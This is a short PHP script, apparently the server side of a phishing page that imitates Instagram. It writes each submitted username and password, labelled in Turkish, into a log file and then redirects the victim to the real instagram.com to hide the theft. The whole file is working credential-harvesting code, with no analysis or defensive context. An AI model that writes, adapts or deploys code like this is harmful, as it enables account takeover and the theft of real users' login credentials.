<?php

file_put_contents("log.txt", "Kullanıcı Adı: " . $_POST['username'] . "\nŞifre: " . $_POST['password'] . "\n\n", FILE_APPEND);
header('Location: https://instagram.com');
exit();